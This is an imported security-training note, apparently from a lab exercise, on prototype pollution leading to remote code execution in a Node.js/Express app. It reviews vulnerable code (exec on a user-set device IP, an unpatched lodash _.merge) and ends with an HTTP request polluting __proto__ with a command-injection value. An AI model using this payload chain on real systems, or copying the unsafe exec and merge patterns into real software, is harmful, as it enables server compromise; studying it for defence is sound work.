---
technique: "Remote Code Execution"
family: "client-side"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/Prototype Pollution/Remote Code Execution.md"
source_sha256: "9ca4d22765315f1f621e2c291fcd17d18044d94650ae07f0e61574ee2dc88232"
curator_version: 2
review_status: imported-unreviewed
---

# Remote Code Execution

> Family: **client-side** · Severity hint: **critical** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `jsx: // ping device IP`
- `jsx: // update user profile`
- `jsx: // custom User class`
- `jsx: router.post("/register", async (req, res) => {`
- `jsx: POST /update HTTP/1.1`

## Playbook (operator notes)

# Remote Code Execution

# **Code Review - Identifying the Vulnerability**

```jsx
// ping device IP
router.get("/ping", AuthMiddleware, async (req, res) => {
    try {
        const sessionCookie = req.cookies.session;
        const username = jwt.verify(sessionCookie, tokenKey).username;

        // create User object
        let userObject = new User(username);
        await userObject.init();

        if (!userObject.deviceIP) {
            return res.status(400).send(response("Please configure your device IP first!"));
        }

        exec(`ping -c 1 ${userObject.deviceIP}`, (error, stdout, stderr) => {
            return res.render("ping", { ping_result: stdout.replace(/\n/g, "<br/>") + stderr.replace(/\n/g, "<br/>") });
        });

    } 
    <SNIP>
});
```

```jsx
// update user profile
router.post("/update", AuthMiddleware, async (req, res) => {
    try {
        const sessionCookie = req.cookies.session;
        const username = jwt.verify(sessionCookie, tokenKey).username;

        // sanitize to avoid command injection
        if (req.body.deviceIP){
            if (req.body.deviceIP.match(/[^a-zA-Z0-9\.]/)) {
                return res.status(400).send(response("Invalid Characters in DeviceIP!"));
            }
        }

        // create User object
        let userObject = new User(username);
        await userObject.init();

        // merge User object with updated properties
        _.merge(userObject, req.body); //library lodash in version 4.6.1
		
        // update DB
        await userObject.writeToDB();

        return res.status(200).send(response("Successfully updated User!"));

    }
    <SNIP>
});
```

https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173732

```jsx
// custom User class
class User {
    constructor(username) {
        this.username = username;
    }
    
    // initialize User object from DB
    async init() {
        const dbUser = await db.Users.findOne({ where: { username: this.username }});

        if (!dbUser){ return; }

        // set all non-null properties
        for (const property in dbUser.dataValues) {
            if (!dbUser[property]) { continue; }

            this[property] = dbUser[property];
        } 
    }

    async writeToDB() {
        const dbUser = await db.Users.findOne({ where: {username: this.username} });
        
        // update all non-null properties
        for (const property in this) {
            if (!this[property]) { continue; }

            dbUser[property] = this[property];
        }

        await dbUser.save();
    }
}
```

```jsx
router.post("/register", async (req, res) => {
    try {
        const username = req.body.username;
        const password = req.body.password;

        <SNIP>

        await db.Users.create({
            username: username,
            password: bcrypt.hashSync(password)
        }).then(() => {
            res.send(response("User registered successfully"));
        });
    } catch (error) {
        console.error(error);
        res.status(500).send({
            error: "Something went wrong!",
        });
    }
});
```

Here, a new user is registered without the `deviceIP` property. Thus, it is set to `null`. If this user is converted to an object of the `User` class in the `init` function, the resulting user object does not contain a `deviceIP` property.

```jsx
POST /update HTTP/1.1
Host: proto.htb
Content-Length: 48
Content-Type: application/json
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InB3biIsImlhdCI6MTY4MTA3MjgxMCwiZXhwIjoxNjgxMDc2NDEwfQ.q1dbloU9k06dAymKHXvMvVrpEeYWRXABx9sK7qG6CWg

{"__proto__":{"deviceIP":"127.0.0.1; whoami"}}
```

## Source
Original note: `_raw/Web attacks/Web Attacks/Prototype Pollution/Remote Code Execution.md`
